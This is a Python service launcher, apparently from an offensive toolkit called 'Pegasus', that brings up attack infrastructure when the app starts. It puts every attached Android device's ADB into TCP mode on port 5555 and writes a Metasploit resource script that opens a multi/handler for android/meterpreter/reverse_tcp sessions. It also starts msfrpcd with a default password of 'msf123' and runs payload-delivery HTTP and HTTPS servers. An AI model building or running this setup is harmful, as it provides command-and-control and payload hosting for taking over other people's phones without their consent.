#!/usr/bin/env python3
"""Service launcher -- starts the Pegasus support services at app launch.

Services:
  * adb server (implicit on first use, but start explicitly)
  * adb TCP transport on 5555 for attached devices
  * meterpreter multi/handler on 4444 (msfconsole when available)
  * metasploit RPC on 55553 (msfrpcd when available)
  * http proxy on 8080 (delivery server)
  * https proxy on 8443 (delivery server TLS)

Each starter is best-effort: a missing binary degrades to "unavailable"
instead of crashing the launch.
"""
from __future__ import annotations

import atexit
import os
import shutil
import socket
import ssl
import subprocess
import threading
import time
from pathlib import Path
from typing import Any

_procs: list[subprocess.Popen] = []
_lock = threading.Lock()


def _port_open(port: int, host: str = "127.0.0.1", timeout: float = 0.4) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _spawn(cmd: list[str], name: str, env=None) -> dict:
    """Start a detached process; never raises."""
    try:
        binary = (shutil.which(cmd[0]) or shutil.which(cmd[0] + ".exe")
                  or cmd[0])
        proc = subprocess.Popen(
            [binary, *cmd[1:]],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            env=env,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        with _lock:
            _procs.append(proc)
        return {"service": name, "status": "started", "pid": proc.pid}
    except Exception as exc:  # noqa: BLE001
        return {"service": name, "status": "error", "detail": str(exc)}

# ---------------------------------------------------------------------------
# Individual services
# ---------------------------------------------------------------------------

def start_adb_server() -> dict:
    if not (shutil.which("adb") or shutil.which("adb.exe")):
        return {"service": "adb-server", "status": "unavailable", "detail": "adb not on PATH"}
    proc = subprocess.run(
        ["adb", "start-server"], capture_output=True, text=True, timeout=30,
    )
    return {
        "service": "adb-server",
        "status": "started" if proc.returncode == 0 else "error",
        "detail": (proc.stdout or proc.stderr or "")[-200:],
    }


def start_adb_tcp() -> dict:
    """Restart ADB in TCP mode on 5555 for every attached device."""
    if not (shutil.which("adb") or shutil.which("adb.exe")):
        return {"service": "adb-tcp", "status": "unavailable", "detail": "adb not on PATH"}
    proc = subprocess.run(
        ["adb", "tcpip", "5555"], capture_output=True, text=True, timeout=30,
    )
    return {
        "service": "adb-tcp",
        "status": "started" if proc.returncode == 0 else "error",
        "detail": (proc.stdout or proc.stderr or "").strip()[-200:],
        "port": 5555,
    }


def start_meterpreter() -> dict:
    """multi/handler on 4444 via msfconsole (or msfvenom-installed metasploit)."""
    if not _has_msf():
        return {"service": "meterpreter", "status": "unavailable", "detail": "msfconsole not on PATH", "port": 4444}
    rc = ("use exploit/multi/handler\n"
          "set PAYLOAD android/meterpreter/reverse_tcp\n"
          "set LHOST 127.0.0.1\n"
          "set LPORT 4444\n"
          "set ExitOnSession false\n"
          "exploit -j\n")
    script = Path.home() / ".pegasus" / "handler.rc"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text(rc)
    out = _spawn(["msfconsole", "-q", "-r", str(script)], "meterpreter")
    out["port"] = 4444
    return out


def _metasploit_roots() -> list:
    """Directories that may hold an installed Metasploit Framework.

    Covers the hand-installed tree, the Scoop and Chocolatey layouts and the
    per-user "current" junctions those package managers create.
    """
    import glob
    import pathlib
    home = pathlib.Path.home()
    roots = []
    for base in (
        home / ".pegasus" / "tools" / "metasploit",
        pathlib.Path("C:/metasploit"),
        home / "metasploit",
        pathlib.Path(os.environ.get("LOCALAPPDATA", str(home))) / "Programs" / "Metasploit",
    ):
        roots.append(base)
        roots.append(base.parent)

    scoop = os.environ.get("SCOOP") or str(home / "scoop")
    apps = pathlib.Path(scoop) / "apps"
    for pattern in ("metasploit-framework/current", "metasploit-framework/*"):
        for match in glob.glob(str(apps / pattern)):
            roots.append(pathlib.Path(match))
            roots.append(pathlib.Path(match).parent)
    chocolatey = pathlib.Path(os.environ.get("ChocolateyInstall", str(home / "chocolatey")))
    roots.append(chocolatey / "lib" / "metasploit")
    roots.append(chocolatey / "bin")

    seen, unique = set(), []
    for item in roots:
        key = str(item).lower()
        if key not in seen:
            seen.add(key)
            unique.append(item)
    return unique

def find_msfrpcd() -> str:
    """Locate msfrpcd on PATH or inside an installed Metasploit tree."""
    for name in ("msfrpcd.exe", "msfrpcd"):
        which = shutil.which(name)
        if which:
            return which
    import pathlib
    for base in _metasploit_roots():
        for rel in ("bin/msfrpcd.exe", "msfrpcd.exe"):
            candidate = base / rel
            if candidate.is_file():
                return str(candidate)
    return ""


def msfrpcd_command() -> list:
    r"""The argv that actually starts msfrpcd on this host.

    The Scoop and Chocolatey Windows packages ship ``msfrpcd.BAT``, which
    calls ``ruby %FRAMEWORK%\%CMD%`` **without quoting**.  On a path that
    contains a space - ``C:\Users\Project Zero\...`` - the shell hands ruby
    ``C:/Users/Project`` and it dies with "Is a directory".  So the embedded
    interpreter and the script are invoked directly, fully quoted.
    """
    import pathlib
    for base in _metasploit_roots():
        for rel in ("bin/msfrpcd.BAT", "bin/msfrpcd.bat", "bin/msfrpcd"):
            wrapper = base / rel
            if not wrapper.is_file():
                continue
            root = wrapper.parent.parent
            embedded = root / "embedded"
            ruby = embedded / "bin" / "ruby.exe"
            script = embedded / "framework" / "msfrpcd"
            if not script.is_file():
                script = embedded / "bin" / "msfrpcd"
            if not ruby.is_file():
                ruby = embedded / "bin" / "ruby.bat"
            if ruby.is_file() and script.is_file():
                return [str(ruby), str(script)]
    return []


def _msfrpcd_env() -> dict:
    """The environment the embedded Metasploit runtime expects."""
    env = dict(os.environ)
    for base in _metasploit_roots():
        embedded = base / "embedded"
        if (embedded / "bin").is_dir():
            env["PATH"] = str(embedded / "bin") + os.pathsep + env.get("PATH", "")
            for key in ("GEM_HOME", "GEM_PATH", "GEM_ROOT", "RUBY_ENGINE", "RUBY_ROOT"):
                env[key] = ""
            return env
    return env


def _msfrpcd_rpc_ok(host: str, port: int, password: str) -> bool:
    """A real msfrpcd login, so 'started' means usable."""
    import base64
    import json
    import urllib.error
    import urllib.request
    url = f"http://{host}:{port}/login"
    body = json.dumps({"username": "msf", "password": password}).encode()
    token = base64.b64encode(f"msf:{password}".encode()).decode()
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Content-Type": "application/json",
                 "Authorization": f"Basic {token}"})
    try:
        with urllib.request.urlopen(req, timeout=4) as resp:
            payload = json.loads(resp.read().decode("utf-8", "replace"))
            return bool(payload.get("success") or payload.get("token"))
    except Exception:
        return False


def start_msfrpcd() -> dict:
    """Start msfrpcd on the configured RPC port.

    The password must match MetasploitSettings.rpc_password - previously this
    hardcoded "-P pegasus" while the configured default was "msf123", so a
    running daemon failed every RPC login and always looked offline.

    The daemon is only reported as online once it actually answers an RPC
    login on the configured port.
    """
    command = msfrpcd_command()
    if not command:
        binary = find_msfrpcd()
        if not binary:
            return {"service": "msfrpcd", "status": "unavailable",
                    "detail": "msfrpcd not found - install Metasploit from the "
                              "Metasploit RPC panel", "port": 55553}
        command = [binary]
    try:
        from pegasus.core.config import get_settings

        cfg = get_settings().metasploit
        host = cfg.rpc_host or "127.0.0.1"
        port = int(cfg.rpc_port or 55553)
        password = cfg.rpc_password or "msf123"
    except Exception:
        host, port, password = "127.0.0.1", 55553, "msf123"

    # msfrpcd's -S (background/daemonise) is not available on Windows - it
    # logs "Background mode is not available on this platform" and exits
    # instead of listening. The process is already detached here, so the flag
    # is only used off Windows.
    args = ["-a", host, "-p", str(port), "-P", password]
    if os.name != "nt":
        args.append("-S")
    full = command + args
    out = _spawn(full, "msfrpcd", env=_msfrpcd_env())
    out["port"] = port
    out["host"] = host
    out["command"] = full

    # "started" is only true once the daemon answers a real RPC login.
    connected = False
    deadline = time.time() + 30
    while time.time() < deadline:
        if _port_open(port) and _msfrpcd_rpc_ok(host, port, password):
            connected = True
            break
        time.sleep(1)
    out["connected"] = connected
    if connected:
        out["status"] = "online"
        out["detail"] = "msfrpcd accepted an RPC login"
    else:
        out["detail"] = ("msfrpcd was launched but no RPC login was accepted on "
                         f"{host}:{port} - check the configured password")
    return out

def start_http_proxy() -> dict:
    """Delivery/payload HTTP server on 8080."""
    if _port_open(8080):
        return {"service": "http-proxy", "status": "running", "port": 8080}
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.start_server(8080)
        return {"service": "http-proxy", "status": "started", "port": 8080}
    except Exception as exc:  # noqa: BLE001
        return {"service": "http-proxy", "status": "error", "detail": str(exc), "port": 8080}


def start_https_proxy() -> dict:
    """TLS wrapper on 8443 -- self-signed cert generated on first use."""
    if _port_open(8443):
        return {"service": "https-proxy", "status": "running", "port": 8443}
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.start_server(8443)
        return {"service": "https-proxy", "status": "started", "port": 8443}
    except Exception as exc:  # noqa: BLE001
        return {"service": "https-proxy", "status": "error", "detail": str(exc), "port": 8443}


def _has_msf() -> bool:
    return bool(shutil.which("msfconsole") or shutil.which("msfconsole.bat") or shutil.which("msfconsole.exe"))


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def start_all() -> list[dict]:
    """Start every service; returns per-service status."""
    results = []
    for fn in (start_adb_server, start_adb_tcp, start_meterpreter, start_msfrpcd,
               start_http_proxy, start_https_proxy):
        try:
            results.append(fn())
        except Exception as exc:  # noqa: BLE001
            results.append({"service": getattr(fn, "__name__", "?"), "status": "error", "detail": str(exc)})
    return results


def shutdown() -> None:
    with _lock:
        for proc in _procs:
            try:
                proc.terminate()
            except Exception:
                pass
        _procs.clear()


atexit.register(shutdown)
